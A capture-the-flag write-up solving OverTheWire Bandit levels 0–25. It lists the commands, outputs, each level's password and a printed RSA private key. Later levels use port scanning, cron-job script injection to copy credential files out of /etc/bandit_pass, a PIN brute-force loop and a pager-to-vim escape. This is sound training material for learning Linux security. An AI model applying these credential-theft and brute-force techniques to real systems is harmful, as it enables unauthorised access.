# OverTheWire - Solutions

I will be writing answers level-wise and the code with outputs will be mentioned as much clearly as I can put it.
The final answer will be the password for the next level at the end of each level.

After level 0, I'll skip the ssh part its almost same for every level except when you get a prvate key.

### Level 0

Go to the bandit0 user and execute the following commands:
Enter the password when prompted.

```sh
$ ssh -p 2220 bandit0@bandit.labs.overthewire.org
bandit0@bandit.labs.overthewire.org's password:
```

```sh
$ ls
readme
$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```

Answer - [boJ9jbbUNNfktd78OOpsqOltutMc3MY1][dill]

### Level 1

In the home directory execute-

```sh
$ ls
-
$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```

Answer - [CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9][dill]

### Level 2

In the home directory execute-

```sh
$ ls
spaces in this filename
$ cat spaces\ in\ this\ filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```

Answer - [UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK][dill]

### Level 3

In the home directory execute-

```sh
$ ls
inhere
$ cd inhere
$ ls -a
. .. .hidden
$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```

Answer - [pIwrPrtPN36QITSp3EQaw936yaFoFgAB][dill]

### Level 4

In the home directory execute-

```sh
$ ls
inhere
$ cd inhere
$ ls -al

-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file00
-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file01
-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file02
-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file03
-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file04
-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file05
-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file06
-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file07
-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file08
-rw-r----- 1 bandit5 bandit4   33 Jun 15 11:41 -file09
drwxr-xr-x 2 root    root    4096 Jun 15 11:41 .
drwxr-xr-x 4 bandit4 bandit4 4096 Jun 19 13:19 ..

$ file ./*

./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data

$ cat ./-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
```

Answer - [koReBOKuIDDepwhWk7jZC0RTdopnAYKh][dill]

### Level 5

In the home directory execute-

```sh
$ ls
inhere
$ cd inhere
$ ls
maybehere00  maybehere02  maybehere04  maybehere06  maybehere08  maybehere10  maybehere12  maybehere14  maybehere16  maybehere18
maybehere01  maybehere03  maybehere05  maybehere07  maybehere09  maybehere11  maybehere13  maybehere15  maybehere17  maybehere19

$ ls -alR | grep -B 8 1033
./maybehere07:
total 56
-rwxr-x---  1 root bandit5 3663 Jun 15 11:41 -file1
-rw-r-----  1 root bandit5 2488 Jun 15 11:41 -file2
-rwxr-x---  1 root bandit5 3362 Jun 15 11:41 -file3
drwxr-x---  2 root bandit5 4096 Jun 15 11:41 .
drwxr-x--- 22 root bandit5 4096 Jun 15 11:41 ..
-rwxr-x---  1 root bandit5 3065 Jun 15 11:41 .file1
-rw-r-----  1 root bandit5 1033 Jun 15 11:41 .file2

$ cat ./maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

Answer - [DXjZPULLxYr17uwoI01bNLQbtFemEgo7][dill]

### Level 6

In the home directory execute-

```sh
$ ls
$ cd /

$ ls -alR | grep -B 100 33 | grep -B 100 bandit6 | grep -B 24 bandit7

./var/lib/dpkg/info:
total 15264
drwxr-xr-x  2 root    root       4096 Jun 15 11:41 .
drwxr-xr-x 15 root    root       4096 Jun 15 11:41 ..
-rw-r--r--  1 root    root         18 Nov  7  2013 adduser.conffiles
-rwxr-xr-x  1 root    root        929 Nov  7  2013 adduser.config
-rw-r--r--  1 root    root       4430 Mar 30 22:25 adduser.list
-rw-r--r--  1 root    root       4508 Nov  7  2013 adduser.md5sums
-rwxr-xr-x  1 root    root        962 Nov  7  2013 adduser.postinst
-rwxr-xr-x  1 root    root        220 Nov  7  2013 adduser.postrm
-rw-rw-r--  1 root    root      15860 Nov  7  2013 adduser.templates
-rw-r--r--  1 root    root        247 Jun 15 11:26 alpine-pico.list
-rw-r--r--  1 root    root        274 May 21  2013 alpine-pico.md5sums
-rwxr-xr-x  1 root    root        265 May 21  2013 alpine-pico.postinst
-rwxr-xr-x  1 root    root        115 May 21  2013 alpine-pico.prerm
-rw-r--r--  1 root    root       1773 Mar 30 22:25 apt-utils.list
-rw-r--r--  1 root    root       2218 Dec  8  2016 apt-utils.md5sums
-rw-r--r--  1 root    root        146 Dec  8  2016 apt.conffiles
-rw-r--r--  1 root    root       9689 Mar 30 22:25 apt.list
-rw-r--r--  1 root    root      10819 Dec  8  2016 apt.md5sums
-rwxr-xr-x  1 root    root       1736 Dec  8  2016 apt.postinst
-rwxr-xr-x  1 root    root        553 Dec  8  2016 apt.postrm
-rw-r--r--  1 root    root         23 Dec  8  2016 apt.shlibs
-rw-r-----  1 bandit7 bandit6      33 Jun 15 11:41 bandit7.password

$ cat ./var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```

Answer - [HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs][dill]

### Level 7

In the home directory execute-

```sh
$ ls
data.txt
$ cat data.txt | grep millionth
millionth  cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```

Answer - [cvX2JJa4CFALtqS87jk27qwqGhBM9plV][dill]

### Level 8

In the home directory execute-

```sh
$ ls
data.txt
$ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```

Answer - [UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR][dill]

### Level 9

In the home directory execute-

```sh
$ ls
data.txt
$ strings data.txt | grep ===
J========== the
========== password
========== is
W========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
```

Answer - [truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk][dill]

### Level 10

In the home directory execute-

```sh
$ ls
data.txt
$ base64 -d data.txt
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```

Answer - [IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR][dill]

### Level 11

In the home directory execute-

```sh
$ ls
data.txt
$ cat data.txt | tr '[a-z][A-Z]' '[n-za-m][N-ZA-M]'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```

Answer - [5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu][dill]

### Level 12

In the home directory execute-

```sh
$ ls
data.txt
$ mkdir /tmp/lol
$ cp data.txt /tmp/lol/
$ cd /tmp/lol
$ xxd -r data.txt test1
$ file test1
test1: gzip compressed data, was "data2.bin", from Unix

$ mv test1 test1.gz
$ gzip -d test1.gz
$ file test1
test1: bzip2 compressed data, block size = 900k

$ bzip -d test1
$ file test1
test1.bz2: gzip compressed data, was "data4.bin", from Unix

$ mv test1 test1.gz
$ gzip -d test1.gz
$ file test1
test1: POSIX tar archive (GNU)

$ tar -xvf test1
$ file data5.bin
data5.bin: POSIX tar archive (GNU)

$ tar -xvf data5.bin
$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k

$ bzip2 -d data6.bin
$ file data6.bin.out
data6.bin.out: POSIX tar archive (GNU)

$ tar -xvf data6.bin.out
$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", from Unix

$ mv data8.bin data8.gz
$ gzip -d data8.gz
$ cata data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

Answer - [8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL][dill]

### Level 13

In the home directory execute-

```sh
$ ls
sshkey.private
$ ssh -i sshkey.private -p 2220 bandit14@bandit.labs.overthewire.org
$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
```

Answer - [4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e][dill]

### Level 14

In the home directory execute-

```sh
$ nc localhost 30000
```

At this point it is watiting for you input so input bandit14 password.

```sh
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
```

Answer - [BfMYroe26WYalil77FoDi9qh59eK5xNr][dill]

### Level 15

In the home directory execute-

```sh
$ openssl s_client -ign_eof -connect localhost:30001
```

At this point it is watiting for you input so input bandit14 password.

```sh
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd
```

Answer - [cluFn7wTiGryunymYOu4RcffSxQluehd][dill]

### Level 16

In the home directory execute-

```sh
$ nmap -sV -vv -p 31000-32000 localhost

Scanning localhost (127.0.0.1) [1001 ports]
Discovered open port 31960/tcp on 127.0.0.1
Discovered open port 31691/tcp on 127.0.0.1
Discovered open port 31790/tcp on 127.0.0.1
Discovered open port 31518/tcp on 127.0.0.1
Discovered open port 31046/tcp on 127.0.0.1

```

Above 5 ports are open..

```sh
$ openssl s_client -connect localhost:31790

cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

$ mkdir /tmp/goingto17
$ vim /tmp/goingto17/sshkey.private
```

Copy the above key in that file.

Before logging in with the sshkey remember to change its permissions by:

```sh
$ chmod 0400 sshkey.private
```

Answer - [sshkey.private][dill]

### Level 17

In the home directory execute-

```sh
$ diff passwords.old passwords.new
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
> eG69HnVwO1p7cOdfhadHkPv8Vn0ChedC

$ cat passwords.new | grep kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
```

Answer - [kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd][dill]

### Level 18

When trying to login through ssh instead of doing regular command use the below command:

```sh
$ ssh -p 2220 bandit18@bandit.labs.overthewire.org 'cat readme'
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

Answer - [IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x][dill]

### Level 19

In the home directory execute-

```sh
$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

Answer - [GbKksEFF4yrVs6il55v6gwY5aVje5f0j][dill]

### Level 20

In the home directory execute-

First Shell:
```sh
nc -l 2608
```

Second shell:
```sh
./suconnect 2608
```

First shell:
```sh
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Correct!
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

Answer - [gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr][dill]

### Level 21

In the home directory execute-

```sh
$ cd /etc/cron.d
$ ls
cron-apt  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  php5

$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

Answer - [Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI][dill]

### Level 22

In the home directory execute-

```sh
$ cd /etc/cron.d
$ ls
cron-apt  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  php5

$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

Make your own script in /tmp directory

```sh
$ cd /tmp/goingto23
$ vim test.sh
#!/bin/bash

myname=bandit23
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget

$ chmod +x test.sh
$ ./test.sh
Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349
./test.sh: line 8: /tmp/8ca319486bfbbc3663ea0fbe81326349: Permission denied

$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

Answer - [jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n][dill]

### Level 23

In the home directory execute-

```sh
$ cd /etc/cron.d
$ ls 
cron-apt  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  php5

$ cat /usr/bin/cronjob_bandit23.sh

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done


$ mkdir /tmp/goingto24
$ chmod 777 /tmp/goingto24
$ cd /tmp/goingto24
$ vim test.sh

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/goingto24/contents.txt

$ chmod 777 test.sh
$ cp test.sh /var/spool/bandit24/
```

Wait for one minute for the cronjob to run

```sh
$ ls
contents.txt  test.sh
$ cat contents.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

Answer - [UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ][dill]

### Level 24

In the home directory execute-

```sh
$ mkdir /tmp/goingto25
$ cd /tmp/goingto25
$ vim test.sh

#!/bin/bash

pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
for i in {0000..9999}; do
   if
      echo "$pass $i" | nc localhost 30002 | grep Wrong > /dev/null;
   then
      echo $i;
   else
      echo "$pass $i" | nc localhost 30002 && exit;
   fi
done

$ chmod 777 test.sh
$ ./tesh.sh
Correct!
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

Answer - [uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG][dill]

### Level 25

In the home directory execute-

```sh
$ ssh -i bandit26.sshkey -p 2220 bandit26@bandit.labs.overthwire.org
```

It logs you out immediately, thus we will have to do something different.

```sh
$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

$ cat/usr/bin/showtext
#!/bin/sh

more ~/text.txt
exit 0
```

Now shorten you terminal (like very small window)
And when it prompts to show more, click v fir "vim"
It will open the vim editor, after that execute-

```sh
:e /etc/bandit_pass/bandit26

5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```
Answer - [5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z][dill]

### Thanks
### License

Free
Provided by Ayush Bansal
